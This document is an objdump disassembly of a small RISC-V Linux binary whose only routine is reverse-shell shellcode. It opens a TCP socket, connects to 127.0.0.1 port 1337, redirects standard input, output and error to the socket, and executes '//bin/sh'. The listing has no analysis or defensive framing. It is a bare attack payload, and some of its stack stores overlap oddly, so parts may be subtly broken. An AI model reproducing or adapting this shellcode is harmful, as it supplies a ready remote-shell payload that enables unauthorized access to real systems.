
bin/asm7c:     file format elf64-littleriscv


Disassembly of section .text:

0000000000010078 <_start>:
   10078:	4509                	li	a0,2
   1007a:	4585                	li	a1,1
   1007c:	4601                	li	a2,0
   1007e:	0c600893          	li	a7,198
   10082:	00000073          	ecall
   10086:	1141                	addi	sp,sp,-16
   10088:	4289                	li	t0,2
   1008a:	e016                	sd	t0,0(sp)
   1008c:	000042b7          	lui	t0,0x4
   10090:	9052829b          	addiw	t0,t0,-1787
   10094:	00513123          	sd	t0,2(sp)
   10098:	010002b7          	lui	t0,0x1000
   1009c:	07f2829b          	addiw	t0,t0,127
   100a0:	00513223          	sd	t0,4(sp)
   100a4:	4581                	li	a1,0
   100a6:	00010593          	mv	a1,sp
   100aa:	4641                	li	a2,16
   100ac:	0cb00893          	li	a7,203
   100b0:	4281                	li	t0,0
   100b2:	00050293          	mv	t0,a0
   100b6:	00000073          	ecall
   100ba:	4501                	li	a0,0
   100bc:	00028513          	mv	a0,t0
   100c0:	4581                	li	a1,0
   100c2:	4601                	li	a2,0
   100c4:	48e1                	li	a7,24
   100c6:	00000073          	ecall
   100ca:	4501                	li	a0,0
   100cc:	00028513          	mv	a0,t0
   100d0:	4585                	li	a1,1
   100d2:	00000073          	ecall
   100d6:	4501                	li	a0,0
   100d8:	00028513          	mv	a0,t0
   100dc:	4589                	li	a1,2
   100de:	00000073          	ecall
   100e2:	69623537          	lui	a0,0x69623
   100e6:	f2f5051b          	addiw	a0,a0,-209
   100ea:	1161                	addi	sp,sp,-8
   100ec:	e02a                	sd	a0,0(sp)
   100ee:	687338b7          	lui	a7,0x68733
   100f2:	f6e8889b          	addiw	a7,a7,-146
   100f6:	01113223          	sd	a7,4(sp)
   100fa:	4881                	li	a7,0
   100fc:	01110893          	addi	a7,sp,17
   10100:	4501                	li	a0,0
   10102:	fef88513          	addi	a0,a7,-17 # 68732fef <__global_pointer$+0x687216cf>
   10106:	4601                	li	a2,0
   10108:	4581                	li	a1,0
   1010a:	4885                	li	a7,1
   1010c:	0dc88893          	addi	a7,a7,220
   10110:	00000073          	ecall
   10114:	4501                	li	a0,0
   10116:	4881                	li	a7,0
   10118:	05d88893          	addi	a7,a7,93
   1011c:	00000073          	ecall
